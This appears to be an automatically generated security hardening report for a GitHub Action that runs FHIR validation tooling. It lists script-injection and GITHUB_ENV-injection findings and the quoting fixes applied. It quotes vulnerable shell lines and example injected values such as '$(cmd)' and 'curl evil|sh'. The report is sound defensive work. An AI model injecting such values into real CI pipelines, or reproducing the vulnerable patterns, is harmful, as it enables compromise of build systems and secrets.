<!-- markdownlint-disable -->

# Hardening Report: FirelyTeam--firely-terminal-pipeline/v0.8.13

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **FirelyTeam--firely-terminal-pipeline/v0.8.13** was hardened automatically. 5 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Rule (b): in the 'Download Java Validator' step, the input JAVA_VALIDATOR_DOWNLOAD_LOCATION is run through eval: `JAVA_VALIDATOR_DOWNLOAD_LOCATION=$(eval echo "$JAVA_VALIDATOR_DOWNLOAD_LOCATION")`. A value like `$(cmd)` or `;cmd` in that input runs as a shell command. Right after that, the result is expanded unquoted in `wget -q $JAVA_VALIDATOR_DOWNLOAD_LOCATION -O validator_cli.jar`.

Locations:

- `action.yml:661`
- `action.yml:665`

### script-injection (severity: high)

Rule (b): many steps expand boolean inputs unquoted and run them as commands, e.g. `if $INPUT_DOTNET_VALIDATION_ENABLED || $INPUT_TERMINOLOGY_SERVICE_BFARM_ENABLED; then`, `if $INPUT_JAVA_VALIDATION_ENABLED; then`, `if $INPUT_SUSHI_ENABLED; then`, `if $CLOSE_SLICING_FOR_VALIDATION; then`, `if $INPUT_SUSHI_USE_CONFIG_DEPENDENCIES; then`, `if $INPUT_JAVA_SNAPSHOT_ENABLED; then`. Because the shell executes the expanded value, any string other than true/false (e.g. `curl evil|sh`) runs as a command. Affected steps include Check if .NET is installed, Check .NET SDK Version, Install Firely.Terminal, Check Firely Terminal Version, Simplifier login, Detect FHIR version, Validate FHIR version support, Set FHIR specification, the SUSHI steps, Pre-processing, Configure validator engine, Run Quality Control checks, Remove package cache, the Java steps and the Re-run SUSHI step.

Locations:

- `action.yml:102`
- `action.yml:113`
- `action.yml:122`
- `action.yml:135`
- `action.yml:144`
- `action.yml:176`
- `action.yml:305`
- `action.yml:367`
- `action.yml:520`
- `action.yml:575`
- `action.yml:632`
- `action.yml:648`
- `action.yml:905`

### script-injection (severity: high)

Rule (b): input-derived env vars are expanded unquoted in command arguments: `dotnet tool install --global Firely.Terminal --version $FIRELY_TERMINAL_VERSION` (Install Firely.Terminal); `fhir login email=$INPUT_SIMPLIFIER_USERNAME password=$INPUT_SIMPLIFIER_PASSWORD` (Simplifier login); `sudo npm install -g fsh-sushi@$SUSHI_VERSION` (Install fsh-sushi); `sushi $INPUT_SUSHI_OPTIONS` (Generate conformance resources and Re-run SUSHI); `echo $INPUT_EXPECTED_FAILS | grep ...` and `fhir check $INPUT_PATH_TO_QUALITY_CONTROL_RULES` (Run Quality Control checks).

Locations:

- `action.yml:124`
- `action.yml:145`
- `action.yml:550`
- `action.yml:560`
- `action.yml:634`
- `action.yml:636`
- `action.yml:907`

### script-injection (severity: high)

Rule (b): both Java validation steps (conformance resources and examples) expand workflow-controlled data unquoted: `for p in $INPUT_PATH_TO_CONFORMANCE_RESOURCES;`, `for p in $PATH_TO_EXAMPLES;`, `echo $INPUT_EXPECTED_FAILS | grep ...`, and `java -jar validator_cli.jar $GITHUB_WORKSPACE/$p*.xml ... -version $FHIR_VERSION $INPUT_JAVA_VALIDATION_OPTIONS $UNESCPAED_IG_DEPENDENCIES ...`. FHIR_VERSION comes from env.FHIR_VERSION, and the IG dependencies come from the repository's package.json.

Locations:

- `action.yml:720`
- `action.yml:778`
- `action.yml:780`
- `action.yml:840`
- `action.yml:860`

### github-env-injection (severity: high)

In the 'Detect FHIR version and determine dependency source' step, fhirVersion is read from the repository's package.json (jq) or sushi-config.yaml (yq), which a pull request can change. It is then written with `echo "FHIR_VERSION=$fhirVersion" >> "$GITHUB_ENV"` without the `printf '%s' ... | tr -d '\n\r'` sanitization. The value is not a literal computed in the script, so a value containing a newline could add arbitrary variables to GITHUB_ENV.

Locations:

- `action.yml:298`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, github-env-injection

**Notes:**

- Every boolean check that used to run the input's value as a command ('if $X; then') is now a string comparison, '[ "$X" = "true" ]'.
- Removed the eval on JAVA_VALIDATOR_DOWNLOAD_LOCATION. Bash now replaces only the documented $JAVA_VALIDATOR_VERSION / ${JAVA_VALIDATOR_VERSION} placeholder, and the URL is passed to wget in quotes.
- Quoted the Firely Terminal version, the fhir login email/password arguments, the fsh-sushi@version argument, $USER and the cache path given to rm -rf.
- The quality-control rules path is passed as ${VAR:+"$VAR"}, so an empty value adds no argument.
- EXPECTED_FAILS goes to grep through printf '%s\n' "$VAR".
- The list inputs SUSHI_OPTIONS, JAVA_VALIDATION_OPTIONS, PATH_TO_CONFORMANCE_RESOURCES, PATH_TO_EXAMPLES and the IG dependencies read from package.json are now split into bash arrays. The arrays are built by unquoted assignment, which splits and globs exactly as upstream did, and are then expanded quoted.
- The -ig parameters from the conformance paths are built as an array instead of one string.
- In the java validator calls, FHIR_VERSION is quoted, and the workspace/path prefix is quoted while the *.xml / *.json globs stay outside the quotes so they still match files.
- fhirVersion is stripped of newlines with tr -d '\n\r' before it is written to GITHUB_ENV.
- Also quoted echo $FHIR_RESTORE, which was not in the findings.

